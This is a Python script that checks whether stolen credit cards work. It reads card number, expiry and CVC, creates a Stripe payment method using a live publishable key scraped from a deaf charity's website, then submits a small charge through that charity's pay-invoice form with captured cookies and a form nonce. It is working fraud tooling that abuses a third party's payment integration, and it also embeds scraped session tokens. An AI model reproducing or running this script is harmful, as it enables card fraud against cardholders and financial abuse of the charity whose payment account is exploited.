import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F11beb56b35%3B+stripe-js-v3%2F11beb56b35%3B+card-element&referrer=https%3A%2F%2Froyaldeaf.org.uk&time_on_page=53755&key=pk_live_51DJKCaAVoSqSbiRireO2aBchwrqxtydwHbPhNVODyarlCTjzfPwqAhmph8m8Cb24KghpxSpIayGaF9ib1Aby5aGZ0068MHkUco'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'cf_clearance': '72Lek.K8ZYSuX7GfR1.bKhix69ol6b5ydqrlfrtJd4M-1738215069-1.2.1.1-S.LnvajcD6cmuhafrYjyWz.CCWXvM3wdw6UcN0KtUQK31ogTi4rUiuvPVHwgECg1H65PA1bRAU9NmEG6Oz2VySWGvV.4lKZc1sOXvfXmYmo02qmrqUVeWqxj0AgF6uIEHpiW29Yun52KOUEeHUiRGaDncZ4.jvLjCuLPny5._0TYVSzjEmF1AD43vtiq3IU8ODTyuPsn2.0k.3CtVqIBttFIXI4KiU1kkGVO2cVMIvsqXhimvJteBQW5IlIWRij2VQWS3OiXdMFNAh8AfFYOcNx3rF273hZX_rmxHixSByE',
	    '__hstc': '237380639.ccbfcbd870767a35d0cede73bc47c8b5.1738215071644.1738215071644.1738215071644.1',
	    'hubspotutk': 'ccbfcbd870767a35d0cede73bc47c8b5',
	    '__hssrc': '1',
	    '__hssc': '237380639.1.1738215071645',
	    'twk_idm_key': 'FgvqjqAaKXkCUVP0VY_Jk',
	    'TawkConnectionTime': '0',
	    'twk_uuid_5e7882778d24fc2265896cdd': '%7B%22uuid%22%3A%221.2BiwH2JZCUnm2mCf4hGv53ggigbeHM2FQQCXGUUsZsYpI0r7rdk0EayxgvUzXF2TerhhTgrSdmYJUBQO6zzHdIv8hAUAfbYCvaCVtJuoNbZgjGpxiACycKb6uM7%22%2C%22version%22%3A3%2C%22domain%22%3A%22royaldeaf.org.uk%22%2C%22ts%22%3A1738215075062%7D',
	    '__stripe_mid': '36b9db6f-6a8f-4146-a461-e6e7fca9c99f21ec92',
	    '__stripe_sid': '3384a1ba-0d39-4801-96ac-1d2d20d5b7b3b77a6b',
	}
	
	headers = {
	    'authority': 'royaldeaf.org.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'cf_clearance=72Lek.K8ZYSuX7GfR1.bKhix69ol6b5ydqrlfrtJd4M-1738215069-1.2.1.1-S.LnvajcD6cmuhafrYjyWz.CCWXvM3wdw6UcN0KtUQK31ogTi4rUiuvPVHwgECg1H65PA1bRAU9NmEG6Oz2VySWGvV.4lKZc1sOXvfXmYmo02qmrqUVeWqxj0AgF6uIEHpiW29Yun52KOUEeHUiRGaDncZ4.jvLjCuLPny5._0TYVSzjEmF1AD43vtiq3IU8ODTyuPsn2.0k.3CtVqIBttFIXI4KiU1kkGVO2cVMIvsqXhimvJteBQW5IlIWRij2VQWS3OiXdMFNAh8AfFYOcNx3rF273hZX_rmxHixSByE; __hstc=237380639.ccbfcbd870767a35d0cede73bc47c8b5.1738215071644.1738215071644.1738215071644.1; hubspotutk=ccbfcbd870767a35d0cede73bc47c8b5; __hssrc=1; __hssc=237380639.1.1738215071645; twk_idm_key=FgvqjqAaKXkCUVP0VY_Jk; TawkConnectionTime=0; twk_uuid_5e7882778d24fc2265896cdd=%7B%22uuid%22%3A%221.2BiwH2JZCUnm2mCf4hGv53ggigbeHM2FQQCXGUUsZsYpI0r7rdk0EayxgvUzXF2TerhhTgrSdmYJUBQO6zzHdIv8hAUAfbYCvaCVtJuoNbZgjGpxiACycKb6uM7%22%2C%22version%22%3A3%2C%22domain%22%3A%22royaldeaf.org.uk%22%2C%22ts%22%3A1738215075062%7D; __stripe_mid=36b9db6f-6a8f-4146-a461-e6e7fca9c99f21ec92; __stripe_sid=3384a1ba-0d39-4801-96ac-1d2d20d5b7b3b77a6b',
	    'origin': 'https://royaldeaf.org.uk',
	    'referer': 'https://royaldeaf.org.uk/pay-invoice/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1738215121821',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=34760&_fluentform_18_fluentformnonce=f090f516e1&_wp_http_referer=%2Fpay-invoice%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&input_text_1=&input_text=&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '18',
	}
	
	r2 = requests.post(
	    'https://royaldeaf.org.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
